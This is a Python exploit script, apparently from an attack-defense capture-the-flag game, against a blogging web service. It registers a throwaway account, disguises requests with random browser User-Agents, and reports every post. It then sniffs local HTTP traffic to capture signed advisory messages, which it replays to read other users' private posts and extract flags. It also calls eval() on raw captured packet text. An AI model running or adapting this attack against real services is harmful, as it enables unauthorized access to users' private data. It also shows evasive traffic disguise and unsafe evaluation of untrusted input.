import json
import os
import random
import re
import string
import sys
import requests
import threading
import time
import pyshark

""" <config> """
PORT = 8000
INTERFACE = 'lo'
# DEBUG -- logs to stderr, TRACE -- log HTTP requests
DEBUG = os.getenv("DEBUG", False)
TRACE = os.getenv("TRACE", False)
""" </config> """


adv_msgs = []


class FakeSession(requests.Session):
    """
    FakeSession reference:
        - `s = FakeSession(host, PORT)` -- creation
        - `s` mimics all standard request.Session API except of fe features:
            -- `url` can be started from "/path" and will be expanded to "http://{host}:{PORT}/path"
            -- for non-HTTP scheme use "https://{host}/path" template which will be expanded in the same manner
            -- `s` uses random browser-like User-Agents for every requests
            -- `s` closes connection after every request, so exploit get splitted among multiple TCP sessions
    Short requests reference:
        - `s.post(url, data={"arg": "value"})`          -- send request argument
        - `s.post(url, headers={"X-Boroda": "DA!"})`    -- send additional headers
        - `s.post(url, auth=(login, password)`          -- send basic http auth
        - `s.post(url, timeout=1.1)`                    -- send timeouted request
        - `s.request("CAT", url, data={"eat":"mice"})`  -- send custom-verb request
        (response data)
        - `r.text`/`r.json()`  -- text data // parsed json object
    """

    USER_AGENTS = [
        """Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15""",
        """Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36""",
        """Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201""",
        """Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2.13; ) Gecko/20101203""",
        """Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/14.0 Opera/12.0""",
    ]

    def __init__(self, host, port):
        super(FakeSession, self).__init__()
        if port:
            self.host_port = "{}:{}".format(host, port)
        else:
            self.host_port = host

    def prepare_request(self, request):
        r = super(FakeSession, self).prepare_request(request)
        r.headers["User-Agent"] = random.choice(FakeSession.USER_AGENTS)
        r.headers["Connection"] = "close"
        return r

    # fmt: off
    def request(self, method, url,
                params=None, data=None, headers=None,
                cookies=None, files=None, auth=None, timeout=None, allow_redirects=True,
                proxies=None, hooks=None, stream=None, verify=None, cert=None, json=None,
                ):
        if url[0] == "/" and url[1] != "/":
            url = "http://" + self.host_port + url
        else:
            url = url.format(host=self.host_port)
        r = super(FakeSession, self).request(
            method, url, params, data, headers, cookies, files, auth, timeout,
            allow_redirects, proxies, hooks, stream, verify, cert, json,
        )
        if TRACE:
            print("[TRACE] {method} {url} {r.status_code}".format(**locals()))
        return r
    # fmt: on


class BackgroundCapturing(threading.Thread):

    def run(self, *args, **kwargs):
        capture = pyshark.LiveCapture(interface=INTERFACE, bpf_filter=f'port {PORT}', display_filter='http', use_json=True, include_raw=True)
        for packet in capture.sniff_continuously(packet_count=100):
            try:
                packet = str(packet)
                index = packet.find("signature")
                if index != -1:
                    adv_msgs.append(eval(packet[index - 48: index + 111]))
            except Exception as e:
                print(e)


def rand_string(len=12):
    alphabet = string.ascii_uppercase + string.ascii_lowercase + string.digits
    return "".join(random.choice(alphabet) for _ in range(len))


a = {'json.member': [{'json.value.number': '172', 'json.key': 'id'}, {'json.value.string': 'YkAnYFuCeMUw', 'json.key': 'username'}, {'json.value.number': '3', 'json.key': 'post_id'}, {'json.value.false': '', 'json.key': 'advised'}]}


def _register(s, username, realname, password):
    print('Registering')
    data = json.dumps({
        "username": username,
        "realname": realname,
        "password": password
    })

    try:
        r = s.post("/api/users", data=data)
    except Exception as e:
        print(f"Failed to register in service: {e}")
        return False

    if r.status_code != 200:
        print(f"Failed to register in service, status code: {r.status_code}")
        return False

    try:
        token = r.json()["access_token"]
    except Exception as e:
        print(f"Failed to register in service: {e}")
        return False

    return token


def _get_posts(s):
    print('Getting posts')
    try:
        r = s.get(f"/api/posts/")
    except Exception as e:
        print(f"Failed to get posts in service: {e}")
        return False
    if r.status_code != 200:
        print(f"Failed to get posts in service, status code: {r.status_code}")
        return False
    try:
        return json.loads(r.text)
    except Exception as e:
        print(f"Failed to get posts in service: {e}")
        return False


def _create_post(s, title, content, private=False):
    post = json.dumps({
        "title": title,
        "content": content,
        "private": private
    })

    try:
        r = s.post("/api/posts", data=post)
    except Exception as e:
        print(f"Failed to craete post in service: {e}")
        return False

    if r.status_code != 200:
        print(f"Failed to craete post in service, status code: {r.status_code}")
        return False

    return r.json()


def _report_post(s, post_id):
    try:
        r = s.get(f"/api/posts/{post_id}/report")
        if r.status_code != 200:
            print(f"Failed to report post in service, status code: {r.status_code}")
            return False
        return json.loads(r.text)
    except Exception as e:
        print(f"Failed to report post in service: {e}")
        return False


def _get_user_posts(s, report_id, username, signature):
    adv_msg = json.dumps({
        "report_id": report_id,
        "username": username,
        "signature": signature
    })
    try:
        r = s.post("/api/posts/adv", data=adv_msg)
        return json.loads(r.text)
    except Exception as e:
        print(f"Failed to get user's posts in service: {e}")
        return False

    if r.status_code != 200:
        print(f"Failed to get user's posts in service, status_code: {r.status_code}")
        return False


def exploit(host: str):
    s = FakeSession(host, PORT)

    fake_username = rand_string()
    fake_realname = rand_string()
    fake_password = rand_string()

    token = _register(s, fake_username, fake_realname, fake_password)

    s.headers = {"Authorization": f"Bearer {token}"}

    flags = []
    # print("USERS: ", users)

    posts = _get_posts(s)

    '''
    usesrnames = {}
    for post in posts:
        try:
            usesrnames.add(post["owner_username"])
        except Exception:
            print("No 'owner_username' field in post")
            pass

    s1 = FakeSession(localhost, PORT)

    posts = []

    for usesrname in usesrnames:
        fake_realname = rand_string()
        fake_password = rand_string()
        token = _register(s1, usesrname, fake_realname, fake_password)
        s1.headers = {"Authorization": f"Bearer {token}"}
        post = _create_post(s1, "1", "1", True)
        posts.append(post)

    for post in posts:
        report = _report_post(s1, post["id"])
    '''

    for post in posts:
        _report_post(s, post["id"])

    time.sleep(10)

    for msg in adv_msgs:
        try:
            posts = _get_user_posts(s, msg['report_id'], msg['username'], msg['signature'])
            for post in posts:
                if re.findall(r"([A-Z0-9]{31}=)", post['content']):
                    flags.append(post['content'])
        except Exception as e:
            print(f"Cant parse advisory msg or post: {e}")
            pass

    return flags


def main():
    capture = BackgroundCapturing()
    capture.start()
    flags = exploit(sys.argv[1])
    for flag in flags:
        match = re.findall(r"([A-Z0-9]{31}=)", str(flag))
        if match:
            print(flag)


if __name__ == "__main__":
    main()
